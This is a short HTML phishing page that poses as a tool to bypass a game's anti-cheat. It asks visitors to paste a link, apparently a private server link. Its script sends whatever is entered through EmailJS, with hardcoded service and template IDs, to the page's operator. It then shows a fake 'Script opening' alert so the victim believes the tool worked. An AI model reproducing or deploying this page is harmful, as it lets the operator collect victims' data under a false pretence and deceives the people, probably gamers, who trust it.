<!DOCTYPE html>
<html>
<head>
    <title>Enter Ur Ps Link To Bypass-AntiCheat</title>

    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

    <style>
        body {
            background-color: black;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }

        .box {
            width: 800px;
            height: 450px;
            border: 4px solid #00ff00;
            background-color: #111;
            text-align: center;
            padding-top: 80px;
            box-shadow: 0 0 25px #00ff00;
        }

        h1 {
            color: #00ff00;
            font-size: 28px;
        }

        input {
            margin-top: 40px;
            width: 70%;
            padding: 15px;
            font-size: 18px;
            background-color: black;
            border: 2px solid #00ff00;
            color: #00ff00;
            outline: none;
        }

        button {
            margin-top: 20px;
            padding: 10px 25px;
            background: black;
            color: #00ff00;
            border: 2px solid #00ff00;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="box">
    <h1>enter somethink to chat with me</h1>

    <input type="text" id="mesaj" placeholder="Paste link here..." required>
    <br>
    <button onclick="gonder()">Send</button>

</div>

<script>
    (function(){
        emailjs.init("0qmYmoIOTH4NkUygT");
    })();

    function gonder() {
        var mesaj = document.getElementById("mesaj").value;

        var params = {
            message: mesaj
        };

        emailjs.send("service_olk42gs", "template_hv7vl8k", params)
        .then(function(response) {
            alert("Script opening");
        }, function(error) {
            alert("Script Updating try later!");
        });
    }
</script>

</body>
</html>
